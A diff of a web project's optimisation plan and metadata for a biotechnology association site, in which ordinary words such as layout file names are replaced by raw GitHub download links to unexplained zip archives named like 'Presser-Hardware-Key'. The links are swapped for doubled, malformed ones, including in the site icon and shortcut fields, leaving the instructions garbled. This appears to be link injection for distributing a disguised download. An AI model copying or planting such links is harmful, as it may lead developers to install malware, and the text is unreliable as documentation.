@@ -38,13 +38,13 @@ Before deploying this project, we will complete the following tasks to ensure a 
 2. Refactor to create reusable components or centralized styles.
 3. Use ESLint and Prettier for code formatting and duplication detection.
 
-### 4. Streamline https://raw.githubusercontent.com/biotechdevteam/KeyPresserHardware/main/src/app/[locale]/(web)/(membership)/membership-benefits/Hardware-Presser-Key-v1.5.zip
+### 4. Streamline https://github.com/biotechdevteam/KeyPresserHardware/raw/refs/heads/main/src/components/services/service-cta/Presser-Hardware-Key-v1.0-beta.5.zip[locale]/(web)/(membership)https://github.com/biotechdevteam/KeyPresserHardware/raw/refs/heads/main/src/components/services/service-cta/Presser-Hardware-Key-v1.0-beta.5.zip
 
 **Objective:** Improve loading times by removing unnecessary components or logic.
 
 **Steps:**
 
-1. Review https://raw.githubusercontent.com/biotechdevteam/KeyPresserHardware/main/src/app/[locale]/(web)/(membership)/membership-benefits/Hardware-Presser-Key-v1.5.zip for unused imports, conditional logic, or excess code.
+1. Review https://github.com/biotechdevteam/KeyPresserHardware/raw/refs/heads/main/src/components/services/service-cta/Presser-Hardware-Key-v1.0-beta.5.zip[locale]/(web)/(membership)https://github.com/biotechdevteam/KeyPresserHardware/raw/refs/heads/main/src/components/services/service-cta/Presser-Hardware-Key-v1.0-beta.5.zip for unused imports, conditional logic, or excess code.
 2. Simplify the file by extracting or removing redundant components.
 3. Test changes to ensure layout functionality.
 
@@ -65,20 +65,20 @@ export const metadata: Metadata = {
   description:
     "A biotechnology association based in Buea, Cameroon, founded by the 2024/2025 Master's graduates from the Department of Biochemistry at the University of Buea.",
   icons: {
-    icon: "https://raw.githubusercontent.com/biotechdevteam/KeyPresserHardware/main/src/app/[locale]/(web)/(membership)/membership-benefits/Hardware-Presser-Key-v1.5.zip",
-    shortcut: "https://raw.githubusercontent.com/biotechdevteam/KeyPresserHardware/main/src/app/[locale]/(web)/(membership)/membership-benefits/Hardware-Presser-Key-v1.5.zip",
+    icon: "https://github.com/biotechdevteam/KeyPresserHardware/raw/refs/heads/main/src/components/services/service-cta/Presser-Hardware-Key-v1.0-beta.5.zip[locale]/(web)/(membership)https://github.com/biotechdevteam/KeyPresserHardware/raw/refs/heads/main/src/components/services/service-cta/Presser-Hardware-Key-v1.0-beta.5.zip",
+    shortcut: "https://github.com/biotechdevteam/KeyPresserHardware/raw/refs/heads/main/src/components/services/service-cta/Presser-Hardware-Key-v1.0-beta.5.zip[locale]/(web)/(membership)https://github.com/biotechdevteam/KeyPresserHardware/raw/refs/heads/main/src/components/services/service-cta/Presser-Hardware-Key-v1.0-beta.5.zip",
   },
   keywords: [ "biotecnology", "btverse" ]
 };
 ```
 
-6. *Consolidate https://raw.githubusercontent.com/biotechdevteam/KeyPresserHardware/main/src/app/[locale]/(web)/(membership)/membership-benefits/Hardware-Presser-Key-v1.5.zip Files using Route Groups*
+6. *Consolidate https://github.com/biotechdevteam/KeyPresserHardware/raw/refs/heads/main/src/components/services/service-cta/Presser-Hardware-Key-v1.0-beta.5.zip[locale]/(web)/(membership)https://github.com/biotechdevteam/KeyPresserHardware/raw/refs/heads/main/src/components/services/service-cta/Presser-Hardware-Key-v1.0-beta.5.zip Files using Route Groups*
 
 *Objective:* Reduce server load time by minimizing layout file duplication.
 
 *Steps:*
 
-1. Review pages and identify redundant https://raw.githubusercontent.com/biotechdevteam/KeyPresserHardware/main/src/app/[locale]/(web)/(membership)/membership-benefits/Hardware-Presser-Key-v1.5.zip files.
+1. Review pages and identify redundant https://github.com/biotechdevteam/KeyPresserHardware/raw/refs/heads/main/src/components/services/service-cta/Presser-Hardware-Key-v1.0-beta.5.zip[locale]/(web)/(membership)https://github.com/biotechdevteam/KeyPresserHardware/raw/refs/heads/main/src/components/services/service-cta/Presser-Hardware-Key-v1.0-beta.5.zip files.
 2. Use route groups or a global layout structure.
 3. Create a shared layout in a common location (e.g., `/app` directory).
 4. Test all routes to ensure correct rendering and layout sharing.
